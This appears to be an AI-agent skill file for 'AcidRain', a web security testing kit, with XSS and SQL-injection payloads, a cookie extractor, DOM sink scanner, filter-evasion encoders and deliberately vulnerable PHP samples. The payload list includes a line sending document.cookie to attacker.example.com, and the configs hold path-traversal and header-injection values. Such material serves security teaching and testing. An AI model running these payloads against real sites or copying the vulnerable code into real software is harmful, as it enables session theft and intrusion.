---
name: acidrain-security-testing
description: Use AcidRain's XSS analysis resources, JavaScript utilities, and PHP injection testing samples for authorized security research and hands-on learning
triggers:
  - test XSS vulnerabilities with AcidRain
  - use AcidRain security scripts
  - run injection testing with AcidRain
  - analyze XSS with AcidRain tools
  - set up AcidRain for security testing
  - create XSS test payloads with AcidRain
  - perform authorized web security testing
  - use AcidRain JavaScript utilities
---

# AcidRain Security Testing Skill

> Skill by [ara.so](https://ara.so) — Security Skills collection.

AcidRain is a 2026 web-oriented collection of XSS analysis resources, JavaScript utilities, PHP examples, injection testing samples, and research snippets designed for authorized security testing and hands-on learning in controlled environments.

## Installation

Clone the repository and navigate to the project directory:

```bash
git clone https://github.com/henry-lewiskpp1107/acidrain-security-script-hub.git
cd acidrain-security-script-hub
```

Expected directory structure:

```text
acidrain-security-script-hub/
├── scripts/
│   ├── javascript/     # Client-side security testing scripts
│   ├── php/           # Server-side PHP examples
│   └── xss/           # XSS-specific payloads and tests
├── configs/           # Configuration files
├── examples/          # Working examples and demonstrations
├── docs/             # Documentation
├── LICENSE
└── README.md
```

## Project Structure and Components

### JavaScript Utilities (Client-Side)

JavaScript utilities are located in `scripts/javascript/`. These are browser-based security testing scripts.

**Basic XSS Test Script:**

```javascript
// scripts/javascript/xss-test-basic.js
// Test for reflected XSS in search parameters

(function() {
  const payload = '<script>alert("XSS")</script>';
  const testUrl = new URL(window.location);
  
  // Test search parameter
  testUrl.searchParams.set('q', payload);
  
  console.log('[AcidRain] Testing URL:', testUrl.toString());
  console.log('[AcidRain] Payload:', payload);
  
  // Check if payload is reflected in DOM
  const bodyText = document.body.innerHTML;
  if (bodyText.includes(payload)) {
    console.warn('[AcidRain] Potential XSS: Payload reflected in DOM');
  }
})();
```

**Cookie Extraction Utility:**

```javascript
// scripts/javascript/cookie-extractor.js
// Extract and log cookies (for authorized testing only)

function extractCookies() {
  const cookies = document.cookie.split(';').map(c => c.trim());
  const cookieData = {};
  
  cookies.forEach(cookie => {
    const [name, value] = cookie.split('=');
    cookieData[name] = value;
  });
  
  console.log('[AcidRain] Cookies extracted:', cookieData);
  return cookieData;
}

// Usage
const cookies = extractCookies();
```

**DOM-Based XSS Scanner:**

```javascript
// scripts/javascript/dom-xss-scanner.js
// Scan for DOM-based XSS sinks

const dangerousSinks = [
  'innerHTML',
  'outerHTML',
  'document.write',
  'eval',
  'setTimeout',
  'setInterval'
];

function scanDOMXSS() {
  const sources = [
    window.location.hash,
    window.location.search,
    document.referrer
  ];
  
  console.log('[AcidRain] Checking DOM sources:', sources);
  
  sources.forEach((source, idx) => {
    if (source && source.length > 0) {
      console.log(`[AcidRain] Source ${idx}:`, source);
      
      // Check for dangerous patterns
      dangerousSinks.forEach(sink => {
        if (document.body.innerHTML.includes(sink)) {
          console.warn(`[AcidRain] Potential sink found: ${sink}`);
        }
      });
    }
  });
}

// Run scanner
scanDOMXSS();
```

### PHP Server-Side Examples

PHP scripts are located in `scripts/php/`. Use these in authorized testing environments with PHP installed.

**Basic Injection Test:**

```php
<?php
// scripts/php/basic-injection-test.php
// Test for SQL injection vulnerabilities (use in isolated environment)

header('Content-Type: text/html; charset=utf-8');

// INSECURE example for testing purposes only
function vulnerableQuery($userInput) {
    // WARNING: This is intentionally vulnerable
    $query = "SELECT * FROM users WHERE name = '" . $userInput . "'";
    
    echo "<h3>AcidRain - Injection Test</h3>";
    echo "<p><strong>Query:</strong> " . htmlspecialchars($query) . "</p>";
    
    // Detection patterns
    $patterns = [
        "'" => "Single quote detected",
        "--" => "SQL comment detected",
        "OR 1=1" => "Tautology detected",
        "UNION" => "UNION injection detected"
    ];
    
    foreach ($patterns as $pattern => $message) {
        if (stripos($userInput, $pattern) !== false) {
            echo "<p style='color: red;'>[AcidRain] {$message}</p>";
        }
    }
}

// Test with GET parameter
if (isset($_GET['test'])) {
    vulnerableQuery($_GET['test']);
} else {
    echo "<p>Add ?test=payload to URL</p>";
}
?>
```

**XSS Reflection Test:**

```php
<?php
// scripts/php/xss-reflection-test.php
// Test XSS reflection and encoding

function testXSSReflection($input) {
    echo "<h3>AcidRain - XSS Reflection Test</h3>";
    
    // Vulnerable reflection (for testing)
    echo "<div class='vulnerable'>";
    echo "<h4>Vulnerable Output:</h4>";
    echo "<p>" . $input . "</p>";
    echo "</div>";
    
    // Safe reflection (encoded)
    echo "<div class='safe'>";
    echo "<h4>Encoded Output:</h4>";
    echo "<p>" . htmlspecialchars($input, ENT_QUOTES, 'UTF-8') . "</p>";
    echo "</div>";
    
    // Detection
    $xssPatterns = [
        '<script' => 'Script tag detected',
        'onerror=' => 'Event handler detected',
        'javascript:' => 'JavaScript protocol detected',
        '<img' => 'Image tag detected'
    ];
    
    foreach ($xssPatterns as $pattern => $message) {
        if (stripos($input, $pattern) !== false) {
            echo "<p style='color: orange;'>[AcidRain] {$message}</p>";
        }
    }
}

if (isset($_GET['payload'])) {
    testXSSReflection($_GET['payload']);
} else {
    echo "<p>Add ?payload=&lt;script&gt;alert('XSS')&lt;/script&gt; to URL</p>";
}
?>
```

**File Upload Validator:**

```php
<?php
// scripts/php/file-upload-test.php
// Test file upload security controls

function analyzeFileUpload($file) {
    $results = [];
    
    // Check extension
    $extension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    $results['extension'] = $extension;
    
    // Check MIME type
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mimeType = finfo_file($finfo, $file['tmp_name']);
    finfo_close($finfo);
    $results['mime_type'] = $mimeType;
    
    // Dangerous extensions
    $dangerous = ['php', 'phtml', 'php3', 'php4', 'php5', 'exe', 'sh'];
    if (in_array($extension, $dangerous)) {
        $results['warning'] = "Dangerous extension detected: {$extension}";
    }
    
    // MIME mismatch
    $expectedMimes = [
        'jpg' => 'image/jpeg',
        'png' => 'image/png',
        'gif' => 'image/gif',
        'pdf' => 'application/pdf'
    ];
    
    if (isset($expectedMimes[$extension]) && $mimeType !== $expectedMimes[$extension]) {
        $results['warning'] = "MIME type mismatch: expected {$expectedMimes[$extension]}, got {$mimeType}";
    }
    
    return $results;
}

// Usage with $_FILES
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['testfile'])) {
    $analysis = analyzeFileUpload($_FILES['testfile']);
    echo "<pre>[AcidRain] File Analysis:\n" . print_r($analysis, true) . "</pre>";
}
?>
```

## XSS Payload Examples

Common XSS payloads for testing (use in `scripts/xss/`):

```html
<!-- scripts/xss/payloads.html -->
<!-- Basic XSS Payloads for Authorized Testing -->

<!-- Script tag injection -->
<script>alert('XSS')</script>

<!-- Image tag with onerror -->
<img src=x onerror=alert('XSS')>

<!-- SVG-based XSS -->
<svg/onload=alert('XSS')>

<!-- Event handler in anchor -->
<a href="javascript:alert('XSS')">Click</a>

<!-- Input with autofocus -->
<input autofocus onfocus=alert('XSS')>

<!-- Iframe with JavaScript protocol -->
<iframe src="javascript:alert('XSS')">

<!-- Encoded payloads -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">

<!-- DOM-based payload -->
<script>document.location='http://attacker.example.com/?c='+document.cookie</script>
```

## Configuration

Create a configuration file for test environments:

```javascript
// configs/test-config.js
// AcidRain test environment configuration

const AcidRainConfig = {
  // Target configuration (use only authorized targets)
  target: {
    url: process.env.ACIDRAIN_TARGET_URL || 'http://localhost:8080',
    protocol: process.env.ACIDRAIN_PROTOCOL || 'http',
    testMode: process.env.ACIDRAIN_TEST_MODE === 'true'
  },
  
  // Logging configuration
  logging: {
    enabled: true,
    verbose: process.env.ACIDRAIN_VERBOSE === 'true',
    outputFile: process.env.ACIDRAIN_LOG_FILE || './acidrain.log'
  },
  
  // Payload settings
  payloads: {
    xssBasic: '<script>alert("XSS")</script>',
    xssImg: '<img src=x onerror=alert("XSS")>',
    sqlBasic: "' OR 1=1--",
    customPayloads: process.env.ACIDRAIN_CUSTOM_PAYLOADS || []
  },
  
  // Safety limits
  safety: {
    requireAuthorization: true,
    maxRequestsPerMinute: 10,
    timeoutMs: 5000
  }
};

module.exports = AcidRainConfig;
```

PHP configuration:

```php
<?php
// configs/test-config.php
// AcidRain PHP configuration

define('ACIDRAIN_TARGET_URL', getenv('ACIDRAIN_TARGET_URL') ?: 'http://localhost:8080');
define('ACIDRAIN_TEST_MODE', getenv('ACIDRAIN_TEST_MODE') === 'true');
define('ACIDRAIN_LOG_FILE', getenv('ACIDRAIN_LOG_FILE') ?: './acidrain.log');

$acidRainConfig = [
    'target' => [
        'url' => ACIDRAIN_TARGET_URL,
        'testMode' => ACIDRAIN_TEST_MODE
    ],
    'payloads' => [
        'xss_basic' => '<script>alert("XSS")</script>',
        'sql_basic' => "' OR 1=1--",
        'path_traversal' => '../../../etc/passwd'
    ],
    'headers' => [
        'User-Agent' => 'AcidRain/2026 (Security Testing)',
        'X-AcidRain-Test' => 'true'
    ]
];
?>
```

## Common Testing Patterns

### Pattern 1: Automated XSS Parameter Testing

```javascript
// examples/automated-xss-test.js
// Automated XSS testing across URL parameters

const payloads = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert("XSS")>',
  '<svg/onload=alert("XSS")>',
  'javascript:alert("XSS")',
  '"><script>alert("XSS")</script>'
];

function testParameterXSS(baseUrl, paramName) {
  const results = [];
  
  payloads.forEach(payload => {
    const url = new URL(baseUrl);
    url.searchParams.set(paramName, payload);
    
    results.push({
      payload: payload,
      testUrl: url.toString(),
      timestamp: new Date().toISOString()
    });
    
    console.log(`[AcidRain] Testing: ${paramName} = ${payload}`);
  });
  
  return results;
}

// Usage (authorized targets only)
const targetUrl = process.env.ACIDRAIN_TARGET_URL || 'http://localhost:8080/search';
const testResults = testParameterXSS(targetUrl, 'q');
console.log('[AcidRain] Test results:', testResults);
```

### Pattern 2: PHP Request Logger

```php
<?php
// examples/request-logger.php
// Log all incoming requests for security analysis

function logRequest() {
    $logData = [
        'timestamp' => date('Y-m-d H:i:s'),
        'method' => $_SERVER['REQUEST_METHOD'],
        'uri' => $_SERVER['REQUEST_URI'],
        'ip' => $_SERVER['REMOTE_ADDR'],
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
        'get' => $_GET,
        'post' => $_POST,
        'cookies' => $_COOKIE,
        'headers' => getallheaders()
    ];
    
    $logFile = getenv('ACIDRAIN_LOG_FILE') ?: './requests.log';
    $logEntry = json_encode($logData, JSON_PRETTY_PRINT) . "\n---\n";
    
    file_put_contents($logFile, $logEntry, FILE_APPEND);
    
    return $logData;
}

// Log every request
$requestData = logRequest();
echo "<pre>[AcidRain] Request logged:\n" . print_r($requestData, true) . "</pre>";
?>
```

### Pattern 3: Header Injection Test

```javascript
// examples/header-injection-test.js
// Test for HTTP header injection vulnerabilities

function testHeaderInjection(headerValue) {
  const injectionPatterns = [
    '\r\n',
    '\n',
    '%0d%0a',
    '%0a',
    'Set-Cookie:',
    'Location:'
  ];
  
  const detected = [];
  
  injectionPatterns.forEach(pattern => {
    if (headerValue.includes(pattern)) {
      detected.push({
        pattern: pattern,
        position: headerValue.indexOf(pattern),
        severity: 'high'
      });
      console.warn(`[AcidRain] Header injection pattern detected: ${pattern}`);
    }
  });
  
  return {
    vulnerable: detected.length > 0,
    patterns: detected,
    input: headerValue
  };
}

// Usage
const userInput = "value\r\nSet-Cookie: session=hijacked";
const result = testHeaderInjection(userInput);
console.log('[AcidRain] Header injection test:', result);
```

## Troubleshooting

### Issue: Scripts Not Executing in Browser

**Solution:** Check browser console for Content Security Policy (CSP) violations:

```javascript
// Check CSP headers
fetch(window.location.href)
  .then(response => {
    const csp = response.headers.get('Content-Security-Policy');
    console.log('[AcidRain] CSP:', csp);
  });
```

### Issue: PHP Scripts Returning Blank Page

**Solution:** Enable error reporting in your test environment:

```php
<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Your AcidRain script here
?>
```

### Issue: Payloads Being Filtered

**Solution:** Test with encoding variations:

```javascript
// examples/payload-encoder.js
function encodePayload(payload, type = 'html') {
  const encoders = {
    html: (str) => str.split('').map(c => `&#${c.charCodeAt(0)};`).join(''),
    url: (str) => encodeURIComponent(str),
    base64: (str) => btoa(str),
    hex: (str) => str.split('').map(c => '\\x' + c.charCodeAt(0).toString(16)).join('')
  };
  
  return encoders[type] ? encoders[type](payload) : payload;
}

// Usage
const original = '<script>alert("XSS")</script>';
console.log('[AcidRain] HTML encoded:', encodePayload(original, 'html'));
console.log('[AcidRain] URL encoded:', encodePayload(original, 'url'));
console.log('[AcidRain] Base64:', encodePayload(original, 'base64'));
```

### Issue: Rate Limiting or Blocking

**Solution:** Implement request throttling:

```javascript
// examples/throttled-tester.js
async function throttledTest(urls, delayMs = 1000) {
  const results = [];
  
  for (const url of urls) {
    console.log(`[AcidRain] Testing: ${url}`);
    // Perform test
    results.push({ url, tested: true });
    
    // Wait before next request
    await new Promise(resolve => setTimeout(resolve, delayMs));
  }
  
  return results;
}
```

## Best Practices

1. **Always obtain authorization** before testing any system
2. **Use isolated environments** for dangerous payload testing
3. **Log all testing activity** with timestamps and targets
4. **Never test production systems** without explicit permission
5. **Validate inputs** even in testing tools to prevent self-XSS
6. **Keep payloads in configuration files** referenced via environment variables
7. **Document all findings** with reproducible steps

## Environment Variables

```bash
# Required for authorized testing
export ACIDRAIN_TARGET_URL="http://localhost:8080"
export ACIDRAIN_TEST_MODE="true"

# Optional configuration
export ACIDRAIN_LOG_FILE="./acidrain-test.log"
export ACIDRAIN_VERBOSE="true"
export ACIDRAIN_PROTOCOL="http"
```
